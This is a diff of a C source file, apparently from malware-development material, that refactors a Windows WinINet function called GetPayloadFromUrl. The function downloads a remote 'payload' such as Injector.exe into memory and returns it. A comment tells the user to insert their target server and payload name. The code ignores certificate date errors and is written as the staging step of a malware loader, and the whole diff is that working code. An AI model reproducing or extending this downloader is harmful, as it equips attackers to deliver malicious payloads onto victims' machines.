@@ -1,75 +1,84 @@
 #include <stdio.h>
-#include <windows.h>
+#include <Windows.h>
 #include <wininet.h>
 
-BOOL GetPayloadFromUrl() {
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
-	HINTERNET	hInternet              = NULL,
-			    hInternetFile          = NULL;
-	
-	DWORD		dwBytesRead            = NULL;
-  
-	SIZE_T		sSize                   = NULL;
-	
-	PBYTE		pBytes                  = NULL; 
-	PBYTE		pTmpBytes               = NULL; 
+	BOOL		bSTATE            = TRUE;
 
-	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	HINTERNET	hInternet         = NULL,
+			    hInternetFile     = NULL;
+
+	DWORD		dwBytesRead       = 0;
+	
+	SIZE_T		sSize             = 0;
+	PBYTE		pBytes            = NULL,
+			    pTmpBytes         = NULL;
+
+	hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternet == NULL) {
 		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
-		return FALSE;
+		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
-	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL); // write your own server's ip and payload name
+	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
 	if (hInternetFile == NULL) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
-		return FALSE;
+		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
 	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
 	if (pTmpBytes == NULL) {
-		return FALSE;
+		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
 	while (TRUE) {
+
 		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
 			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
-			return FALSE;
-		}
-		sSize += dwBytesRead;
-
-		if (pBytes == NULL)
-			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
-		else{
-			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
-        }
-		if (pBytes == NULL) {
-			return FALSE;
+			bSTATE = FALSE; goto _EndOfFunction;
 		}
 
-		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
-
-		memset(pTmpBytes, '\0', dwBytesRead);
-		if (dwBytesRead < 1024) {
+		if (dwBytesRead == 0) {
 			break;
 		}
 
+		sSize += dwBytesRead;
+
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
+		else
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		if (pBytes == NULL) {
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+		
+		memcpy(pBytes + (sSize - dwBytesRead), pTmpBytes, dwBytesRead);
 	}
 
-	InternetCloseHandle(hInternet);
-	InternetCloseHandle(hInternetFile);
-	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-	LocalFree(pTmpBytes);
-	LocalFree(pBytes);
+	*pPayloadBytes = pBytes;
+	*sPayloadSize  = sSize;
 
-	return TRUE;
+_EndOfFunction:
+	if (hInternet)
+		InternetCloseHandle(hInternet);
+	if (hInternetFile)
+		InternetCloseHandle(hInternetFile);
+	if (pTmpBytes)
+		LocalFree(pTmpBytes);
+	return bSTATE;
 }
 
 int main(int argc, char *argv[]) {
-    if (GetPayloadFromUrl()) {
-        printf("[+] Payload downloaded successfully.\n");
-    } else {
-        printf("[!] Failed to download payload.\n");
-    }
-    return 0;
+	PBYTE payloadBytes = NULL;
+	SIZE_T payloadSize = 0;
+
+	if (GetPayloadFromUrl(L"https://127.0.0.1:8000/Injector.exe", &payloadBytes, &payloadSize)) { // write your target server and payload name in here
+		printf("[+] Payload downloaded successfully. Size: %llu bytes.\n", payloadSize);
+		LocalFree(payloadBytes);
+	} else {
+		printf("[!] Failed to download payload.\n");
+	}
+	return 0;
 }
